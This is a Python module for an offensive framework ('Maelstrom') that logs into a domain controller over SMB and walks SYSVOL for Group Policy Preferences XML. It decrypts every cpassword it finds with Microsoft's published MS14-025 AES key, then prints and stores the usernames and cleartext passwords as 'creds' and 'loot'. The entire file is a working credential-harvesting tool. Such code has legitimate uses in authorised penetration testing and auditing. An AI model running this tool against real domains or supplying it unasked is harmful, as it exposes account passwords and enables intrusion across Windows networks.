"""GPP cpassword hunt in SYSVOL (Maelstrom's gpp_password).

Group Policy Preferences used to let admins push local users, service
accounts, and scheduled tasks with passwords — stored in XML under
\\<DC>\SYSVOL\<domain>\Policies as a "cpassword". The AES key encrypting
them is PUBLISHED BY MICROSOFT (MS14-025), so any cpassword is cleartext
credentials waiting to be read. The patch stopped NEW ones being set;
old ones linger in domains for years. One of the great free wins of AD
recon: readable by any authenticated user.

The check: walk SYSVOL's Policies tree for *.xml, pull cpassword
attributes, decrypt with the known key (AES-256-CBC, zero IV), report
username + cleartext, store as creds + loot.
"""

import base64
import re

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from Cryptodome.Cipher import AES
    from impacket.smbconnection import SMBConnection
except ImportError:
    AES = SMBConnection = None  # console gates run() on requirements

# the AES key Microsoft published in MS14-025
GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc057990209b09a433b66c1b"
)

CPASSWORD_RE = re.compile(
    r'userName="([^"]*)"[^>]*cpassword="([^"]+)"|'
    r'cpassword="([^"]+)"[^>]*userName="([^"]*)"'
)
XML_EXT = ".xml"


def find_cpasswords(xml_text):
    """(username, cpassword) pairs from a GPP XML blob, either attribute
    order (Properties emits them in different orders per file type)."""
    pairs = []
    for user1, cpass1, cpass2, user2 in CPASSWORD_RE.findall(xml_text):
        pairs.append((user1 or user2, cpass1 or cpass2))
    return pairs


def decrypt_cpassword(value):
    """cpassword -> cleartext. AES-256-CBC, zero IV, PKCS#7 padding,
    UTF-16LE — and a key Microsoft gave the world."""
    blob = base64.b64decode(value)
    if len(blob) % 16:
        raise ValueError("not a multiple of the block size")
    plain = AES.new(GPP_KEY, AES.MODE_CBC, b"\x00" * 16).decrypt(blob)
    pad = plain[-1]
    if 0 < pad <= 16:
        plain = plain[:-pad]
    return plain.decode("utf-16-le")


class GppPassword(AuxiliaryModule):
    name = "GPP cpassword Hunt (SYSVOL)"
    description = """
        Walks the DC's SYSVOL share for Group Policy Preferences XML and
        decrypts every cpassword found with Microsoft's published AES
        key (MS14-025). Cleartext credentials, readable by any domain
        user. Passwords land in the store as creds and loot.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller(s), comma-separated"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Any domain user (SYSVOL read)"))
        self.options.add(OptString("PASSWORD", required=True, description="Password"))

    def run(self):
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME") or "")
        password = str(self.get_option("PASSWORD") or "")
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._hunt(host, domain, user, password)

    def _hunt(self, host, domain, user, password):
        try:
            conn = SMBConnection(host, host, sess_port=445, timeout=30)
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: SMB login as {user} failed - {e}")
            return
        self.print_status(f"{host}: authenticated as {user}, walking SYSVOL")
        store = getattr(self.framework, "store", None)
        base = f"\\{domain.lower()}\\Policies"
        found = 0
        try:
            for path in self._walk(conn, base):
                found += self._check_file(conn, host, path, store)
        finally:
            conn.close()
        if found == 0:
            self.print_status(f"{host}: no cpasswords in SYSVOL")

    def _walk(self, conn, path):
        """Yield full paths of every .xml under a SYSVOL directory."""
        try:
            entries = conn.listPath("SYSVOL", path + "\\*")
        except Exception as e:
            self.print_debug(f"listPath {path}: {e}")
            return
        for entry in entries:
            name = entry.get_longname()
            if name in (".", ".."):
                continue
            full = f"{path}\\{name}"
            if entry.is_directory():
                yield from self._walk(conn, full)
            elif name.lower().endswith(XML_EXT):
                yield full

    def _check_file(self, conn, host, path, store):
        hits = 0
        try:
            buf = bytearray()
            conn.getFile("SYSVOL", path, buf.extend)
        except Exception as e:
            self.print_debug(f"read {path}: {e}")
            return 0
        text = bytes(buf).decode("utf-8", errors="replace")
        for username, cpassword in find_cpasswords(text):
            try:
                cleartext = decrypt_cpassword(cpassword)
            except Exception as e:
                self.print_debug(f"{path}: undecryptable cpassword: {e}")
                continue
            hits += 1
            self.print_good(f"{username} : {cleartext}  ({path})")
            if store is not None:
                store.add_cred(host, "smb", username, cleartext, source="gpp")
                store.add_loot("gpp-password", f"{username} @ {host}",
                               f"{username}\t{cleartext}\t{path}", address=host)
        return hits
